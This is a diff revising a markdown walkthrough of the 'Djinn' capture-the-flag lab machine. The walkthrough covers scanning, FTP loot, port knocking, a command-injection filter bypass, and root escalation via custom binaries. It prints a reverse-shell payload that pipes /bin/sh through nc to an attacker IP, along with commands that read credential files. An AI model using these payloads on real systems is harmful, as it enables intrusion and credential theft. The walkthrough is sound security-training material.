@@ -10,18 +10,20 @@
   CTF By <a href="https://twitter.com/0xmzfr">0xmzfr</a>
 <br>
   Walkthrough By <a href="https://n0khodsia.github.io/">n0khodsia</a>
+  <br>
+  27/11/2019
 </h4>
 
 ***
 
 
 ## LAUNCH
-For this CTF I'll use Kali Linux on VMWare.
-After launching the VM, the following screen pops off, giving us a head-start with the machine's IP:
+For this CTF I'll use Kali Linux on VMWare.  
+After launching the Djin VM, the following screen pops off, giving us a head-start with the machine's IP:
 
 ![](images/djin1/ip.png)
 
-In our machine, we match the hostname `ctf` to the IP:
+On our Kali machine, we match the hostname `ctf` to the IP:
 ```bash
 nano /etc/hosts
 
@@ -30,9 +32,8 @@ nano /etc/hosts
 192.168.1.102   ctf
 ```
 
-
 ## NMAP
-Let's start by scanning the machine:
+Let's start by scanning the target:
 
 ```bash
 root@kali:~# nmap -sV -p- ctf
@@ -48,13 +49,13 @@ PORT     STATE SERVICE VERSION
 MAC Address: 00:0C:29:3D:F0:FA (VMware)
 ```
 
-As we can see, we have 4 different services: FTP(21), SSH(22), Unknown(1337) and HTTP (7331).
+As we can see, we have 4 different ports: FTP(21), SSH(22), Unknown(1337) and HTTP (7331).
 
 ## FTP
-Let's try and connect to the FTP server with anonymous account (and no password)  
+Let's try and connect to the FTP server with anonymous username (and no password)  
 ![](images/djin1/ftp.png)
 
-It works, and we have 3 different files `message.txt`, `gamee.txt` & `creds.txt`
+It works, and we have 3 different files `message.txt`, `gamee.txt` & `creds.txt`:
 ```bash
 root@kali:~# cat message.txt
 @nitish81299 I am going on holidays for few days, please take care of all the work.
@@ -65,6 +66,8 @@ final level and get the prize.
 root@kali:~# cat creds.txt
 nitu:81299
 ```
+
+Game on port 1337? let's check it out.
 
 ## PORT 1337
 Trying to connect to port 1337 with Netcat, gives us the following message:
@@ -98,14 +101,16 @@ Answer my questions 1000 times and I'll give you your gift.
 >
 
 ```
-This little game will only accept the correct answer to the mathematical equation,
-and will provide us with another one if we answer correctly.
+This little game will only accept the correct answer to a mathematical equation,
+and will provide us with another equation if we answer correctly.
+
+It looks like the goal is to create a loop that will recieve and solve equations a thousand times within the same connection.
 
 I have written a script in Bash that receives the equation,
 strips all the unnecessary characters, solves it and sends it back to the program:
 
 ```bash
-
+#!/bin/bash
 exec 3<>/dev/tcp/ctf/1337                                             #start the connection
 prob1=$(head -10 <&3 | awk '/^Answer/ {getline; print}')              #grep the line below 'answer'
 prob2=$(echo $prob1 | sed 's|[()'\'',]||g')                           #strip chars from equation
@@ -127,7 +132,7 @@ head -100 <&3                                                         #after 100
                                                                       #first 100 rows of the programs output
 ```
 
-After executing my script, I received the 'gift':
+After executing my script, we receive the 'gift':
 ```bash
 996 # Query received: (9, '-', 3) - Math is: 9 - 3 = 6
 997 # Query received: (8, '*', 4) - Math is: 8 * 4 = 32
@@ -139,10 +144,11 @@ Here is your gift, I hope you know what to do with it:
 1356, 6784, 3409
 ```
 
-This combination of numbers had me confused at first, until I realised it's a **port knocking sequence**!
+This combination of numbers had me confused at first, until I realised it's a [**port knocking sequence**](https://en.wikipedia.org/wiki/Port_knocking)!
 
 ## Port Knocking
-So I tried port knocking with the sequence we received:
+
+Now we try port knocking with the sequence we received:
 ```bash
 root@kali:~# knock -v ctf 1356, 6784, 3409
 hitting tcp 192.168.1.102:1356
@@ -150,7 +156,7 @@ hitting tcp 192.168.1.102:6784
 hitting tcp 192.168.1.102:3409
 ```
 
-Followed by another full port scan to see if anything changed:
+Followed by another full port scan to see if anything has changed:
 ```bash
 root@kali:~# nmap -sV -p- ctf
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-27 12:39 EST
@@ -165,26 +171,25 @@ PORT     STATE SERVICE VERSION
 MAC Address: 00:0C:29:3D:F0:FA (VMware)
 ```
 
-SSH is no longer filtered.
-I tried every possible combination with the info we got from our 3 FTP files, but had no success.
-So, I moved on to the HTTP service.
+It looks like the port knocking changed the SSH port from filtered to open.
+I tried every possible combination with the info we got from our 3 FTP files, but had no successful login.
+So, we move forward on to the HTTP service.
 
 ## HTTP
 Port 7331 offers us a website running with Werkzeug httpd 0.16.0
 
-I tried looking around but nothing came up.
-Finally I decided to run `dirb` but with the huge `rockyou.txt` password file.
+Trying the regular scans give us no results.  
+We try to run `dirb` again, but this time using the huge `rockyou.txt` password file.
 
-After a couple of minutes, I have found that the directory /wish exists on the web-server.
+After a couple of minutes, we found that the directory `/wish` exists on the web-server.  
+`/wish` offers us an input that leads to OS command injection:
+![](images/djin1/http2.png)
 
-Now we encounter an input that lets you inject OS commands.
+But theres a catch. Several characters such as `. $ / ^ ;` are blocked from being sent, so getting a reverse shell feels impossible with these restrictions.
 
-The trick here is that several characters are blocked from being sent, so getting a reverse shell feels impossible.
-
-I have decided to get into the bottom of this issue and browse the source code.
-Luckily, the command `python -m SimpleHTTPServer 8080` was not blocked.
-
-This opened another web server on port 8080, which allows me to see the content of the web-server folder.
+So now we want to perhaps try and view the source code in order to fully understand why certain characters are being blocked.
+Luckily, the command `python -m SimpleHTTPServer 8080` was not blocked, letting us open a web server on port 8080 and see the content it's files:
+![](images/djin1/http3.png)
 
 App.py (which handles the servers' requests) had the following piece in it's source code:
 ```python
@@ -208,16 +213,15 @@ def validate(cmd):
 
 ```
 
-From this I understand that if we add `"/home/nitish/.dev/creds.txt"` to our command injection,
-and don't have `cat` command, we will be able to bypass the character block we encountered earlier,
-and establish a reverse shell.
+By reading this we can understand that if we add `"/home/nitish/.dev/creds.txt"` to our command injection,
+while not having the `cat` command at the same time, we will be able to bypass the restrictions we encountered earlier, use all characters and establish a reverse shell.
 
-First of all, we must listen for incoming connections:
+First of all, we must listen for incoming connections on our Kali machine:
 ```bash
 nc -nlvp 7777
 ```
 
-Next, we start to establish the reverse shell. `%26%26` is the URL encoding for `&&`,
+Next, we try to establish the reverse shell. `%26%26` is the URL encoding for `&&`,
 which lets us bypass character blocking because `/home/nitish/.dev/creds.txt` is technically a part of the command:
 ```http
 POST /wish HTTP/1.1
@@ -240,7 +244,7 @@ Followed by this command to connect to my nc listener:
 cmd=/bin/sh 0</tmp/backpipe | nc 192.168.1.103 443 1>/tmp/backpipe  %26%26 /home/nitish/.dev/creds.txt
 ```
 
-Connected successfully:
+Connected successfully as the user `www-data`:
 ```bash
 root@kali:~# nc -nlvp 443
 listening on [any] 443 ...
@@ -255,7 +259,7 @@ cat /home/nitish/.dev/creds.txt
 nitish:p4ssw0rdStr3r0n9
 ```
 
-Looks like SSH credentials to me. Shall we give it a try? ;)
+Looks like SSH credentials!
 
 ## Privilege Escalation
 Trying to login to SSH with the credentials above was successful, and we got the user flag:
@@ -279,9 +283,10 @@ usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
 genie: error: the following arguments are required: wish
 ```
 
-We have the custom binary program `genie` that takes different arguments.
-Let's try and get some info about it using `strings`:
+User *nitish* can run `/usr/bin/genie/` with *sam*'s permissions.  
+The binary program `genie` takes different arguments, and does not seem to help us get anything by using it 'as planned'.
 
+Let's try and get some info about `genie` using `strings`:
 ```bash
 nitish@djinn:~$ strings /usr/bin/genie
 
@@ -297,9 +302,8 @@ args
 
 ```
 
-As we can see, the argument `-cmd` exists in strings output, but not in the -h(elp) menu within the program.
-Let's give it a try:
-
+As we can see, the argument `-cmd` exists in `strings` output, but not in the -h(elp) menu within `genie`.
+Looks like a hidden argument. Let's give it a try:
 ```bash
 nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd id
 my man!!
@@ -307,9 +311,8 @@ $ id
 uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
 ```
 
-Were not escalated into Sam's user.
-
-Let's upgrade to /bin/bash and `sudo -l` as Sam:
+We have escalated into the user *sam*.
+Let's upgrade to /bin/bash and `sudo -l` as *sam*:
 ```bash
 $ /bin/bash
 sam@djinn:~$ sudo -l
@@ -320,7 +323,8 @@ User sam may run the following commands on djinn:
     (root) NOPASSWD: /root/lago
 ```
 
-Another custom binary program. Let's try that one too:
+User *sam* can run `/root/lago/` with *root* permissions.
+Looks like another binary program. Let's execute it:
 ```bash
 sam@djinn:~$ sudo /root/lago
 What do you want to do ?
@@ -331,16 +335,16 @@ What do you want to do ?
 Enter your choice:
 ```
 
-This one took the most time for me to crack.
-Choosing two gives us:
+This one took the most time for me to crack.  
+Option 2 (Guess the number) gives us the following challenge:
 ```bash
 Choose a number between 1 to 100:
 Enter your number:
 ```
-After messing around and trying endless things, i have tried entering 'num' in order to confuse the program and create
-a situation where "num = num".
-To my surprise, it actually worked!
 
+After messing around and trying different methods, i thought of entering 'num' instead of a number,
+in order to confuse the program and create a situation where "num = num",
+meaning we technically 'guessed' the number. To my surprise, it actually worked:
 ```bash
 Choose a number between 1 to 100:
 Enter your number: num
@@ -349,8 +353,8 @@ uid=0(root) gid=0(root) groups=0(root)
 # ls /root
 lago  proof.sh
 ```
-We gained root access! let's try and run `proof.sh`:
 
+We gained root access! let's try and run `proof.sh`:
 ```bash
     _                        _             _ _ _
    / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
@@ -372,9 +376,9 @@ By @0xmzfr
 Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
 ```
 
-## This was a fun challenge, covering various aspects of cybersecurity.
-## Thank you so much @0xmzfr for this amazing CTF!
+## This has been a fun challenge, covering various aspects of cybersecurity.
+## Thank you so much <a href="https://twitter.com/0xmzfr">@0xmzfr</a> for this amazing CTF!
 
 
-
+***
 <p align="center">Written by n0khodsia</p>
